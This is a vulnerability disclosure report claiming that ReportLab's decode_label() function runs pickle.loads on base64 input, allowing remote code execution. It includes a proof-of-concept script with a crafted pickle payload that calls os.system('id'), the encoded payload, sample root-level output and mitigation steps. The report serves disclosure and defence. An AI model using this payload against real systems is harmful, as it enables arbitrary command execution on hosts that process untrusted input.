# Vulnerability Report

## Vulnerability Name
```
Vulnerability Name: ReportLab <= 4.4.3 vulnerable to Remote Code Execution (RCE) via unsafe deserialization in decode_label()
```

## Affected URL and Area
```
Affected Package: reportlab (PyPI, ReportLab project)
Affected Module/Function: reportlab.lib.utils.decode_label
Affected Version: <= 4.4.3 (latest tested)
```

## Vulnerability Description
```
ReportLab provides PDF generation utilities widely used in Python projects.

Through version 4.4.3 (latest tested), the function
`reportlab.lib.utils.decode_label()` is vulnerable to **remote code execution (RCE)**
because it directly calls `pickle.loads()` on base64-decoded user-supplied input.

An attacker can supply a crafted base64 string containing a malicious pickle payload.
When `decode_label()` is invoked on this input, arbitrary Python objects are
deserialized, enabling the execution of system commands such as `os.system("id")`.

This is a classic **insecure deserialization vulnerability (CWE-502)** similar in
impact to previous CVEs in PyYAML and sqlitedict, and enables attackers to execute
arbitrary code when untrusted input reaches this function.
```

## Severity and Risk Rating
```
Severity: Critical
Risk Rating: Critical
```

## CVE, CWE, CVSS Score and Vulnerability Class
```
CVE: Not yet assigned
CWE-ID: CWE-502 (Deserialization of Untrusted Data)
CVSS Score: 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)
Vulnerability Class: Insecure Deserialization / Remote Code Execution
```

## Impact of Vulnerability
```
An attacker who can influence input passed to decode_label() can:

- Execute arbitrary system commands on the victim machine
- Read, modify, or delete arbitrary files
- Achieve full compromise of the host environment
- Potentially escalate privileges if ReportLab runs with higher permissions

Because ReportLab is used in many web frameworks, ERP systems, and PDF generators,
this vulnerability has a wide potential impact.
```

## Steps to Reproduce
```
Steps to reproduce:

1. Install ReportLab:
   pip install reportlab==4.4.3

2. Create a PoC script (poc.py) with the following code:

   import pickle, base64
   from reportlab.lib import utils

   payload = b"cos\nsystem\n(S'id'\ntR."
   encoded = base64.b64encode(payload).decode("latin1")

   print("[*] Encoded payload:", encoded)

   result = utils.decode_label(encoded)
   print("[*] RCE Result:", result)

3. Run the script:
   python3 poc.py

4. Observe that arbitrary shell commands are executed
   upon calling decode_label(), demonstrating RCE.
```

## Proof of Concept (PoC)
- PoC Script: [View poc.py](https://github.com/Whyshealwaysbrokeme/vuln-reportlab-4.4.3-decode_label-rce/blob/main/report/poc.py)  

- PoC Screenshot:  
  ![PoC Script](https://github.com/Whyshealwaysbrokeme/vuln-reportlab-4.4.3-decode_label-rce/blob/main/report/poc.png)  

- Execution Output:  
  ![Execution Output](https://github.com/Whyshealwaysbrokeme/vuln-reportlab-4.4.3-decode_label-rce/blob/main/report/output.png)  

Example Output (on vulnerable system):
```
[*] Encoded payload: Y29zCnN5c3RlbQooUydpZCcKdFIu
uid=0(root) gid=0(root) groups=0(root)
[*] RCE Result: 0
```

## Source Code Reference
```
reportlab/lib/utils.py (ReportLab 4.4.3)
Line 122:
    def decode_label(label):
        return pickle.loads(base64_decodebytes(label.encode('latin1')))
```

## Mitigation/Remediation
```
Mitigation Steps:

1. Do not use pickle.loads() on untrusted input.
2. Replace pickle with a safe serialization format such as JSON.
3. Add explicit warnings in documentation about unsafe functions.
4. Consider removing or deprecating decode_label() to avoid misuse.
```

## References
```
- CWE-502: Deserialization of Untrusted Data
  https://cwe.mitre.org/data/definitions/502.html
- CVSS v3.1 Specification
  https://www.first.org/cvss/specification-document
- ReportLab Project: https://www.reportlab.com/
```

## Disclosure
```
Disclosure Date: 25 August 2025
Reporter: Manopakorn Kooharueangrong (Whyshealwaysbrokeme)
Status: Under Responsible Disclosure
```
